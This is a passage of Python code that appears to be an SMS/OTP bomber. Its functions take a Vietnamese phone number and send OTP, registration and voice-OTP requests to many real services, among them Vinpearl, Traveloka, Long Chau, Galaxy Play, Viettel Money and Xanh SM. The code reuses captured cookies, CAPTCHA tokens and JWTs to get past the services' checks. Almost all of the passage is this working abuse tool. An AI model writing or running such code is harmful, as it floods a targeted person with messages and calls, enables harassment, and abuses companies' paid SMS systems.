        'captchat': '03AFcWeA6FD9EelBdsrVKHbdBJeFirlLDqs6uUyjoSlEpOPu0kW1MpuxZq0WIDH3ZG2BNcm-geCeDFoN_ttxSy_fri8OhUZyNBztp-bQIKX3Nkxy8DTI23SIvXiY4deERRTn648ujmGof9n64xZPqqszck0WxmJDoVR302TlgZRffLW98h06B-G5OxSQazLtC0Sp1BrxwnRxZ8QqY-hFZJs622LIW7iHOdEu-szSTW8zfXKx34bAQULS9zs2LfL7u7V8p1U4TNOjm6oQy1O2L3_i4sZAgUPl64LEKDX5nGwP6G-622G99MlF-jys_iWxxBaGJJjR_XrCRiYy_S2MmHPiR1vmHYU6XhK3d3LemE1vZm5ZTGXT1kaHt6PoqrRYkq7x7BFy8i5_I-e3WhKc4uRF6ZTve35n-iR8TpbuUsWCTX05ofVz6HTliRwcH_UITx4CHovH51Fuf0ko9Q5PFdevOieOLMIH-txiPmaFbTEdo-7lXQ8uOvilc5Q7lMSKMIPqwKW73NEtUHgX56vCv6stbOIUeTp83n3oDcTi33WBnQhtPbqt2CXdmheoPB8bXy0tNPE4hsNTXEgdegwPzgZVe5Mt_m_AdTJYj9tZTi6NHKbzMytlt8LVhVW9PQyvaH6RyDznWp4sP5ggOQTwdy6CRieWf5S10IxlgEAI2Jfx43OxrWA_bc4X6F4JxOBSE7feyIbXDHpOQYNa7rMwrPbELE9YQVJS6RlUPOAnol0_qb0ez6Ajx-rF8QzBKphGaiOJsqYfADpVQluBkQVrLsGFUbh_XlvI8TUtfJzNKOFe7o0rXqOjfdVC8uRqPZY1fbS9QT7TlJVfXdfDBKlHLw3E5plm3-5zZIAyDMQFr8GJLgRgnsCAp3Qf0im-wjRQSONR1MwBumNho2MH039zwiDgVWc50BqFiCvhhsSdxhz_gMjAjvM_TDawV8PyAxesgrDRKzrUA3A4qFYxDK8dPKOd5MQt6wGn7ZmmbkLC2cfBK5P7AKiMynlHm07P_b_T1eCyDl_NvcVsGF9p9OlE1jx7pkqIf2dT6ZLIS467Sk_XgjbG4hZy17520iK6AntQheXkfyhKxAEUrL06_VlU0cpSupjCw2tlaAMMefkZOxZYP0g9LHKMe2DgT5hPwyJAXwbUlQagul4_mI2aWnxRh4Nzrpweqa8QrM2HpVxZtkrBGYko5lmw3-fiUTvsA-QzX6MVf_q1Ltzw8Un-YdZTEIM0ZxZkTvAdpYyDKSrjR9ZVOjHK7qFhM0VdtmiUXHccTsrv88Y_UJbDkOaHHf7GfcwPBnwDdflVRKsllc2rRTpxdNI-ZwnDBHW0_2t2q8XPR0sTNea_cAl8Luvf95e--WWkVN70MUXq9a5ruwzFRvMS8EHz1VIicMd3OloLnO0zdOZ-bcifucDJD1MSJ_lCj1KdSs4Uh5YYv2iLdd_F5xS8_rupL4_2mtE3t4YXqwqmGMRkIUriEtCT9KwT9YSR2JMeBRPMm9LAyiWvNhMb4GNE0wYgKpWMtFGk0n7vUL2d4C_HXvm4HYecb56mPFqOlfUVxFVnuyHVRIDZXcGgQpPnbck3Gj-hM859anXjlkTQS_iEFkgv1odXZw0W6I9HxkXaAzsfPQF-sZAQsG1a2AeS_9tt9fuZdSz5_0L2Mdwd-Nx8laf77R6pr2G4AwoaLxc3v6PfS9lUh5L5DprhCUftJVWcbr4x_SBeIl_cv_E0wE1TP0kp-ZlMZ0ENFnDebQiGabeVZMIhpNIXT9Z_G5LOGKr5UOCkIWUsisZH1WPz0bXfEKYB2VxQVzcJe0kAoJj_71CRkeWFdLxGiC0hhorobwC0gx5GXkb_kBKrCxKzpE4FVANQIBUrbsx3a5enmbdd06UUrnfHQstTUE_YSLkUY1iZvMqHUM3gG74mhS71c0-BcEMisBfAI_UiLKaBTUdS_nOMW8f8QsN4AZxO_Es67NDYIy65fv-s3aXyo2J5EFo3pBfSDFhpZR',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://spacet.vn',
        'priority': 'u=1, i',
        'referer': 'https://spacet.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://api.spacet.vn/www/user/phone', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND spacet:", response.text)

def send_otp_via_vinpearl(sdt):


    cookies = {
        '__cf_bm': 'ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw',
        '__cfruid': '3f11778af16256a63eb265af0f726daceeb866de-1722350965',
    }

    headers = {
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': '__cf_bm=ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw; __cfruid=3f11778af16256a63eb265af0f726daceeb866de-1722350965',
        'dnt': '1',
        'priority': 'i',
        'referer': 'https://booking.vinpearl.com/vi/login-vpt?callback=vinpearl.com/auth0/sso?redirectUrl=https://vinpearl.com/vi/bo-tui-16-dia-diem-du-lich-ha-long-lam-say-long-du-khach',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    response = requests.get('https://booking.vinpearl.com/static/media/otp_lock.26ac1e3e.svg', cookies=cookies, headers=headers)


    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'access-control-allow-headers': 'Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://booking.vinpearl.com',
        'priority': 'u=1, i',
        'referer': 'https://booking.vinpearl.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-display-currency': 'VND',
    }

    json_data = {
        'channel': 'vpt',
        'username': sdt,
        'type': 1,
        'OtpChannel': 1,
    }

    response = requests.post(
        'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
        headers=headers,
        json=json_data,
    )

    print('thành Công') #("OTP SEND vinpearl:", response.text)


def send_otp_via_traveloka(sdt):
    # Kiểm tra và chuyển đổi số điện thoại
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]

    cookies = {
        'tv-repeat-visit': 'true',
        'countryCode': 'VN',
        'tv_user': '{"authorizationLevel":100,"id":null}',
        'aws-waf-token': '98d9a3ce-74ae-4c55-9bc7-7f7bfd38eb33:AAoAv+Nn46QoAAAA:gvxS6OK/WD3sgvZHozCEooVHTXFGAse4BHwX3duvO+1ES7UfgyxW6JHZw/k60EUGp/zHOcObgnYj0450R3SsunEzxE12r6B4nqNXb12qrlWT68DMtNKLE+LXTcI/ssNVkL0bTzMBfZy87typHsUqku8II9EBQ9+yrb4IwvRLQJ+dmRBmjBXZEV/Jnj6ME53ngtZW+cIk0vb0tOi38a7mSK9uZw==',
        'tvl': 'Pp2fiNmPN9ehu7LHMwNpGSSbQ0zEW8yNJGNrzEA+b5Tu/0QLSpEb9I15NcVASi6xJr7DpGrOW4FLV8SlNNIS5eciWJ9DfTh0Rbclt/MUEHKt6Liu/yDwgdnfnNkZKsVz21+N16DTS1sA51j3T1hUeUkdZnQ4Fql7MYzqG7/ae3YyBZr5Ks3dvYv7j7osaueb96QnQa/Hzd7of7MTXYnzZbl0A9Yi9G3pWvWsmPXbQonHXb1qNRSCi5KVUWjjYHkcHvCLnDOGI3o=~djAy',
        'tvs': 'kOOPm9nR1+er1b8TFCAUgDLEIZ3VFBFIPFWJkFnDJ4stbii+OyDY47kN6Azp58gWhUyymih08uHGt5lhT4PvuwxDSvjXKwvZ/02k2VjAe65GOakasngrQF4EGjnnw3DDuoETUig5QjfQDfgEftAjG85pM6p6TvSU31SizW/I9caAmXpcw3LUVuyTt78y12sZZpeW+OUayg==~djAy',
        '_dd_s': 'rum=0&expire=1722352252222&logs=1&id=a1a90fe7-fce8-48b0-9100-5f789ab941af&created=1722351314461',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.traveloka.com',
        'priority': 'u=1, i',
        'referer': 'https://www.traveloka.com/vi-vn/explore/destination/kinh-nghiem-du-lich-ha-long-acc/148029',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-domain': 'user',
        'x-route-prefix': 'vi-vn',
    }

    json_data = {
        'fields': [],
        'data': {
            'userLoginMethod': 'PN',
            'username': sdt,
        },
        'clientInterface': 'desktop',
    }

    response = requests.post('https://www.traveloka.com/api/v2/user/signup', cookies=cookies, headers=headers, json=json_data)
    print('thành Công') #("OTP SEND traveloka:", response.text)



def send_otp_via_dongplus(sdt):


    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'ert': 'DP:f9adae3150090780ee8cfac00fc7cc13',
        'origin': 'https://dongplus.vn',
        'priority': 'u=1, i',
        'referer': 'https://dongplus.vn/user/registration/reg1',
        'rt': '2024-07-30T22:25:19+07:00',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'mobile_phone': sdt,
    }

    response = requests.post('https://api.dongplus.vn/api/v2/user/check-phone', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND dongplus:", response.text)


def send_otp_via_longchau(sdt):


    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': sdt,
        'otpType': 0,
        'fromSys': 'WEBKHLC',
    }

    response = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND :", response.text)



def send_otp_via_longchau1(sdt):

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': sdt,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    response = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND :", response.text)


def send_otp_via_galaxyplay(sdt):

    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        # 'content-length': '0',
        'dnt': '1',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    response = requests.post('https://api.glxplay.io/account/phone/checkPhoneOnly', params=params, headers=headers)
    print('thành Công') #("OTP SEND galaxyplay:", response.text)
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'app_category': 'app',
        'app_version': '2.0.0',
        'app_env': 'prod',
        'session_id': '03ffa1f4-5695-e773-d0bc-de3b8fcf226d',
        'client_ip': '14.170.8.116',
        'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'client_timestamp': '1722356171541',
        'model_name': 'Windows',
        'user_id': '',
        'client_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'event_category': 'account',
        'on_screen': 'login',
        'from_screen': 'landing_page',
        'event_action': 'click',
        'direct_object_type': 'button',
        'direct_object_id': 'submit_phone_number',
        'direct_object_property': sdt,
        'indirect_object_type': '',
        'indirect_object_id': '',
        'indirect_object_property': '',
        'context_format': '',
        'profile_id': '',
        'profile_name': '',
        'profile_kid_mode': '0',
        'context_value': {
            'is_new_user': 1,
            'new_lp': 0,
            'testing_tag': [],
        },
        'mkt_source': '',
        'mkt_campaign': '',
        'mkt_medium': '',
        'mkt_term': '',
        'mkt_content': '',
    }

    response = requests.post('https://tracker.glxplay.io/v1/event', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND galaxyplay:", response.text)




    print('thành Công') #("OTP SEND :", response.text)
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        # 'content-length': '0',
        'dnt': '1',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
    print('thành Công') #("OTP SEND galaxyplay:", response.text)

def send_otp_via_emartmall(sdt):
    cookies = {
        'emartsess': '30rqcrlv76osg3ghra9qfnrt43',
        'default': '7405d27b94c61015ad400e65ba',
        'language': 'vietn',
        'currency': 'VND',
        'emartCookie': 'Y',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=30rqcrlv76osg3ghra9qfnrt43; default=7405d27b94c61015ad400e65ba; language=vietn; currency=VND; emartCookie=Y',
        'DNT': '1',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': sdt,
    }

    response = requests.post(
        'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    print('thành Công') #("OTP SEND emartmall:", response.text)



def send_otp_via_ahamove(sdt):

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://app.ahamove.com',
        'priority': 'u=1, i',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'mobile': sdt,
        'country_code': 'VN',
        'firebase_sms_auth': True,
    }

    response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND ahamove:", response.text)











def send_otp_via_ViettelMoney(sdt):

    url = "https://api8.viettelpay.vn/customer/v2/accounts/register"

    payload = json.dumps({
    "identityType": "msisdn",
    "identityValue": sdt,
    "type": "REGISTER"
    })

    headers = {
    'User-Agent': "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
    'Accept-Encoding': "gzip;q=1.0, compress;q=0.5",
    'Content-Type': "application/json",
    'app-version': "8.8.8",
    'product': "VIETTELPAY",
    'type-os': "ios",
    'accept-language': "vi",
    'imei': "DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD",
    'device-name': "iPhone",
    'os-version': "16.0",
    'authority-party': "APP",
    'Cookie': "_cfuvid=LAz8zVX12FF46VbA10qwPet5oT9iRMPRjuqQY5gK2_Q-1722405472979-0.0.1.1-604800000; __cf_bm=yVd7Vck.vpCRs0GU0WsQidPJgvwCAz77zL_F_DRq98k-1722405467-1.0.1.1-eqfWY8VnQhNl9u9CbrHJ1HJYeuy_mkVC7NP6JWCnwgF5TBDChHaIL13xaPd_qsuu_TNacDBFSs2EyDjLV.Larg"
    }

    response = requests.post(url, data=payload, headers=headers)

    print('thành Công') #("OTP SEND Viettel Money:", response.text)


def send_otp_via_xanhsmsms(sdt):
        # Kiểm tra và chuyển đổi số điện thoại
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    elif sdt.startswith('03'):
        sdt = '+84' + sdt[1:]
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"

    params = {
    'aud': "user_app",
    'platform': "ios"
    }

    payload = json.dumps({
    "is_forgot_password": False,
    "phone": sdt,
    "provider": "VIET_GUYS"
    })

    headers = {
    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
    'Accept': "application/json",
    'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    'Content-Type': "application/json",
    'app-version-label': "3.15.0",
    'app-build-number': "89",
    'accept-language': "vi",
    'platform': "iOS",
    'aud': "user_app"
    }

    response = requests.post(url, params=params, data=payload, headers=headers)

    print('thành Công') #("OTP SEND Xanh SM-SMS:", response.text)


def send_otp_via_xanhsmzalo(sdt):


        # Kiểm tra và chuyển đổi số điện thoại
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    elif sdt.startswith('03'):
        sdt = '+84' + sdt[1:]

    url = "https://api.gsm-api.net/auth/v1/public/otp/send"

    params = {
    'platform': "ios",
    'aud': "user_app"
    }

    payload = json.dumps({
    "phone": sdt,
    "is_forgot_password": False,
    "provider": "ZNS_ZALO"
    })

    headers = {
    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
    'Accept': "application/json",
    'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    'Content-Type': "application/json",
    'app-version-label': "3.15.0",
    'app-build-number': "89",
    'accept-language': "vi",
    'platform': "iOS",
    'aud': "user_app"
    }

    response = requests.post(url, params=params, data=payload, headers=headers)


    print('thành Công') #("OTP SEND Xanh SM-Zalo:", response.text)



def send_otp_via_popeyes(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://popeyes.vn',
        'ppy': 'CWNOBV',
        'priority': 'u=1, i',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': sdt,
        'firstName': 'Nguyễn',
        'lastName': 'Ngọc',
        'email': 'th456do1g110@hotmail.com',
        'password': 'et_SECUREID()',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', headers=headers, json=json_data)

    print('thành Công') #("OTP SEND popeyes:", response.text)

















def send_otp_via_ACHECKIN(sdt):
    # Request 1
    url1 = "https://codepush.appcenter.ms/v0.1/public/codepush/update_check"

    params1 = {
    'deployment_key': "NyrEQrG2NR2IzdRgbTsfQZV-ZK7h_tsz8BjMd",
    'app_version': "1.5",
    'package_hash': "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
    'label': "v39",
    'client_unique_id': generate_random_id()
    }

    headers1 = {
    'User-Agent': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
    'Accept': "application/json",
    'Content-Type': "application/json",
    'x-codepush-plugin-version': "5.7.0",
    'x-codepush-sdk-version': "^3.0.1",
    'Accept-Language': "vi-VN,vi;q=0.9",
    'x-codepush-plugin-name': "react-native-code-push"
    }

    response1 = requests.get(url1, params=params1, headers=headers1)
    print('thành Công') #("Response ACHECKIN 1:", response1.text)

    # Request 2
    url2 = "https://id.acheckin.vn/api/graphql/v2/mobile"

    payload2 = json.dumps({
    "operationName": "IdCheckPhoneNumber",
    "variables": {
        "phone_number": sdt
    },
    "query": "query IdCheckPhoneNumber($phone_number: String!) {\n  mutation: checkPhoneNumber(phone_number: $phone_number)\n}\n"
    })

    headers2 = {
    'User-Agent': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
    'Content-Type': "application/json",
    'accept-language': "vi-VN,vi;q=0.9",
    'authorization': "undefined"
    }

    response2 = requests.post(url2, data=payload2, headers=headers2)
    print('thành Công') #("Response ACHECKIN 2:", response2.text)

    # Request 3
    payload3 = json.dumps({
    "operationName": "RequestVoiceOTP",
    "variables": {
        "phone_number": sdt,
        "action": "REGISTER",
        "hash": "6af5e4ed78ee57fe21f0d405c752798f"
    },
    "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
    })

    response3 = requests.post(url2, data=payload3, headers=headers2)
    print('thành Công') #("Response ACHECKIN 3:", response3.text)







def send_otp_via_APPOTA(sdt):


    # Request 1
